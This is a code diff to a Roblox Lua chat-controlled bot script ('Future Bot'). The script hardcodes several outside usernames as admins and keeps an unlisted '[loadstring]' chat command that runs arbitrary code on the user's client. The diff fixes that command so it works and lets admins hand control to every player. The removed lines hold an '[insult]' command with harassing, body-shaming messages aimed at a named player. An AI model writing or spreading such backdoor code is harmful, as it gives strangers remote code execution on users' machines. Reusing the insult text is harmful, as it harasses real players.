@@ -5,10 +5,14 @@ local TextChatService = game:GetService("TextChatService")
 local PathfindingService = game:GetService("PathfindingService")
 local LocalPlayer = Players.LocalPlayer
 
-local admins = {}
-table.insert(admins, LocalPlayer.UserId)
+_G.admins = {}
+table.insert(_G.admins, LocalPlayer.UserId)
 if game.Players:FindFirstChild("Steve_Bloks") then
-	table.insert(admins, game.Players:FindFirstChild("Steve_Bloks"))
+	table.insert(_G.admins, game.Players:FindFirstChild("Steve_Bloks").UserId)
+elseif game.Players:FindFirstChild("xe_ukisohiosigma") then
+	table.insert(_G.admins, game.Players:FindFirstChild("xe_ukisohiosigma").UserId)
+elseif game.Players:FindFirstChild("I_94r") then
+	table.insert(_G.admins, game.Players:FindFirstChild("I_94r").UserId)
 end
 
 local function Chat(txt)
@@ -87,6 +91,7 @@ local function JumpPower(jp)
 end
 
 TextChatService.OnIncomingMessage = nil
+local readit = false
 
 TextChatService.MessageReceived:Connect(function(message)
     local txtSource = message.TextSource
@@ -101,14 +106,14 @@ TextChatService.MessageReceived:Connect(function(message)
 
     local lowerMsg = string.lower(tostring(txtMsg))
 
-    if lowerMsg == "[sit]" and table.find(admins, txtSource.UserId) then
+    if lowerMsg == "[sit]" and table.find(_G.admins, txtSource.UserId) then
         Sit()
-	elseif string.split(lowerMsg, " ")[1] == "[loadstring]" and table.find(admins, txtSource.UserId)
+	elseif string.split(lowerMsg, " ")[1] == "[loadstring]" and table.find(_G.admins, txtSource.UserId) then
 		local cmd = string.split(txtMsg, " ")[2]
 		if cmd then
 			loadstring(cmd)()
 		end
-    elseif lowerMsg == "[come]" and table.find(admins, txtSource.UserId) then
+    elseif lowerMsg == "[come]" and table.find(_G.admins, txtSource.UserId) then
         local player = Players:GetPlayerByUserId(txtSource.UserId)
         if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
 			Jump()
@@ -117,58 +122,66 @@ TextChatService.MessageReceived:Connect(function(message)
 			Chat("[FBot]: Going to "..player.Name)
             Path(hrp.Position)
         end
-    elseif lowerMsg == "[jump]" and table.find(admins, txtSource.UserId) then
+    elseif lowerMsg == "[jump]" and table.find(_G.admins, txtSource.UserId) then
         Jump()
-    elseif lowerMsg == "[reset]" and table.find(admins, txtSource.UserId) then
+    elseif lowerMsg == "[reset]" and table.find(_G.admins, txtSource.UserId) then
         Reset()
-    elseif string.sub(lowerMsg, 1, 7) == "[speed]" and table.find(admins, txtSource.UserId) then
+    elseif string.sub(lowerMsg, 1, 7) == "[speed]" and table.find(_G.admins, txtSource.UserId) then
         local cmd = string.split(lowerMsg, " ")
         local speed = cmd[2]
-        Speed(speed)
-		Chat("[FBot]: WalkSpeed set to "..speed)
-    elseif string.split(lowerMsg, " ")[1] == "[goto]" and table.find(admins, txtSource.UserId) then
-		warn(lowerMsg)
+		if speed ~= nil then
+			Speed(speed)
+			Chat("[FBot]: WalkSpeed set to "..speed)
+		else
+			Chat("[error] missing speed value.")
+		end
+    elseif string.split(lowerMsg, " ")[1] == "[goto]" and table.find(_G.admins, txtSource.UserId) then
 		local msgg = string.split(txtMsg, " ")
-		warn(msgg)
 		local player = Players:FindFirstChild(msgg[2])
-		warn(player.Name)
         if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
 			Jump()
 			task.wait(0.05)
             local hrp = player.Character.HumanoidRootPart
 			Chat("[FBot]: Going to "..player.Name)
             Path(hrp.Position)
-        end
-	elseif string.sub(lowerMsg, 1, 7) == "[admin]" and table.find(admins, txtSource.UserId) then
+        else
+			Chat("[error] no player found for goto command, make sure to use capital letters and put the full username. (dev info: "..txtMsg..", "..tostring(player)..", "..lowerMsg..")")
+		end
+	elseif string.sub(lowerMsg, 1, 7) == "[admin]" and table.find(_G.admins, txtSource.UserId) then
 		local cmd = string.split(txtMsg, " ")
 		if cmd[2] == "all" then
 			for _, p in game.Players:GetPlayers() do
-				table.insert(admins, p.UserId)
+				table.insert(_G.admins, p.UserId)
 			end
 			Chat("[FBot]: Everyone is now a controller. Use [cmds] for a list of commands.")
 		else
 			local target = game.Players:FindFirstChild(cmd[2])
 			if target and target.UserId then
-				table.insert(admins, target.UserId)
+				table.insert(_G.admins, target.UserId)
 				Chat("[FBot]: User "..target.Name.." is now a controller. Use [cmds] for a list of commands.")
+			else
+				Chat("[error] missing username.")
 			end
 		end
-	elseif string.split(lowerMsg, " ")[1] == "[jumppower]" and table.find(admins, txtSource.UserId) then
+	elseif string.split(lowerMsg, " ")[1] == "[listadmins]" and table.find(_G.admins, txtSource.UserId) then
+		local names = {}
+		for _, id in _G.admins do
+			local plr = game.Players:GetPlayerByUserId(id)
+			if plr then
+				table.insert(names, plr.Name)
+			end
+		end
+		Chat("[FBot]: Current controllers: "..table.concat(names, ", ")..".")
+	elseif string.split(lowerMsg, " ")[1] == "[jumppower]" and table.find(_G.admins, txtSource.UserId) then
         local cmd = string.split(lowerMsg, " ")
         local speed = cmd[2]
 		if speed then
 			JumpPower(speed)
 			Chat("[FBot]: JumpPower set to "..speed)
 		else
-			Chat("0x8879ccvi7U_")
+			Chat("[error] missing input value.")
 		end
-	elseif string.split(lowerMsg, " ")[1] == "[insult]" and table.find(admins, txtSource.UserId) then
-		local cmd = string.split(txtMsg, " ")
-        local target = cmd[2]
-		local sentences = {target.Name.." ur actually so ugly bro 😂", target.Name.." i know 5 fat people and you're 3 of them", "imagine being called "..target.Name, "LOL what a loser, everybody laugh at "..target.Name.."!", "Im a robot with hard-coded insults and even im more original than "..target.Name.." 😂", target.Name.." you're so fat i can see your fat around the horizion from china 💀", target.Name.." you smell like dog piss mixed with rotten potatos and milk", target.Name.."... yeah thats the joke, you're the joke.", target.Name.." there are "..tostring(#game.Players:GetPlayers()).." players in this server and you're 3 of this 💀"}
-		local sentence = math.random(1, #sentences)
-		Chat(sentence)
-	elseif string.split(lowerMsg, " ")[1] == "[listinv]" and table.find(admins, txtSource.UserId) then
+	elseif string.split(lowerMsg, " ")[1] == "[listinv]" and table.find(_G.admins, txtSource.UserId) then
 		local gears = {}
 		for _, thing in game.Players.LocalPlayer.Backpack:GetChildren() do
 			table.insert(gears, thing.Name)
@@ -182,10 +195,33 @@ TextChatService.MessageReceived:Connect(function(message)
 		else
 			Chat("[FBot]: My inventory is empty!")
 		end
-	elseif string.sub(lowerMsg, 1, 7) == "[cmds]" then
-		Chat("[FBot]: Commands: [come], [goto] <playername>, [reset], [jump], [sit], [speed] <number>, [jumppower] <number>, [listinv]")
+	elseif lowerMsg == "[info]" then
+		Chat("[FBot]: Future Bot is a WIP remote control bot created by S_B, if you're currently a controller you can do [cmds] for a list of commands.")
+	elseif string.sub(lowerMsg, 1, 7) == "[cmds]" and table.find(_G.admins, txtSource.UserId) then
+		Chat("[FBot]: Commands: [info], [come], [goto] <playername>, [admin] <playername/\"all\">, [reset], [jump], [sit], [speed] <number>, [jumppower] <number>, [listinv]")
+		if readit == false then
+			readit = true
+			task.wait(0.8)
+			Chat("(developer note: while reading testing logs i noticed some people dont get the command structure, for example goto is \"[goto] coolplayer65\" but is constantly misunderstood as \"[goto coolplayer64]\" or other mispellings. Also thanks for interacting with my project :D )")
+		end
 	end
 end)
 
+local testingRandomMode = false
+local secureNameSet = "ZaylonBuilds"
+
 warn("loaded")
-Chat("Future Bot loaded! [Version A0.1.3_1]")
+Chat("Future Bot loading! [Version A0.1.3_]")
+if testingRandomMode == true then
+	task.wait(5)
+	Chat("[FBot]: This is an automatic test, making a random user a controller.")
+	task.wait(1)
+	local randomInt = math.random(1, #game.Players:GetPlayers())
+	local random = game.Players:GetPlayers()[randomInt]
+	task.wait()
+	if random.Name == "FutureHub_Official" then
+		Chat("[admin] "..secureNameSet)
+	else
+		Chat("[admin] ".."ZaylonBuilds")
+	end
+end
